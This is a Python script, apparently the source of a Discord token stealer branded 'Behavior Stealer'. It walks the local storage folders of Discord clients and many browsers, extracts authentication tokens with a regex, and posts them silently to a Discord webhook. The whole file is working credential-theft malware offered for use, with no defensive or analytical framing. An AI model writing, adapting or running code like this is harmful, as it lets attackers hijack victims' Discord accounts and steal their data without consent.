import os
import re
import requests

def get_discord_tokens():
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
    tokens = []

    roaming = os.getenv("APPDATA")
    local = os.getenv("LOCALAPPDATA")

    browser_folders = {
        'Discord': roaming + '\\discord\\Local Storage\\leveldb\\',
        'Discord Canary': roaming + '\\discordcanary\\Local Storage\\leveldb\\',
        'Lightcord': roaming + '\\Lightcord\\Local Storage\\leveldb\\',
        'Discord PTB': roaming + '\\discordptb\\Local Storage\\leveldb\\',
        'Discord Development': roaming + '\\DiscordDevelopment\\Local Storage\\leveldb\\',
        'Opera': roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
        'Amigo': local + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
        'Torch': local + '\\Torch\\User Data\\Local Storage\\leveldb\\',
        'Kometa': local + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
        'Orbitum': local + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
        'CentBrowser': local + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
        '7Star': local + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
        'Vivaldi': local + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
        'Chrome': local + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        'Chrome1': local + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
        'Chrome2': local + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
        'Chrome3': local + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
        'Chrome4': local + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
        'Chrome5': local + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\',
        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
        'Iridium': local + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
    }

    def scan_leveldb_for_tokens(leveldb_path):
        found = []
        if not os.path.exists(leveldb_path):
            return found
        try:
            for filename in os.listdir(leveldb_path):
                if filename.endswith((".log", ".ldb")):
                    with open(os.path.join(leveldb_path, filename), errors="ignore") as f:
                        for line in f:
                            found += re.findall(token_regex, line)
        except:
            pass
        return found

    for path in browser_folders.values():
        tokens += scan_leveldb_for_tokens(path)

    return list(set(tokens))



def send_tokens_embed(webhook_url, tokens):
    max_tokens = 10
    tokens_preview = tokens[:max_tokens]

    description = "```\n"
    description += "\n".join(f"{token}" for token in tokens_preview)
    if len(tokens) > max_tokens:
        description += f"\n...and {len(tokens) - max_tokens} more tokens"
    description += "\n```"

    embed = {
        "username": "Behavior Stealer",
        "avatar_url": "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png", 
        "embeds": [
            {
                "title": "\U0001F451 Discord Tokens",
                "description": description,
                "color": 0xFF0000,
                "footer": {"text": "Behavior Stealer \U0001F47E"}
            }
        ]
    }

    try:
        requests.post(webhook_url, json=embed)
    except:
        pass


def main():
    tokens = get_discord_tokens()
    if tokens:
        print("")
        send_tokens_embed(Behavior, tokens)
    else:
        print("")


if __name__ == "__main__":
    main()
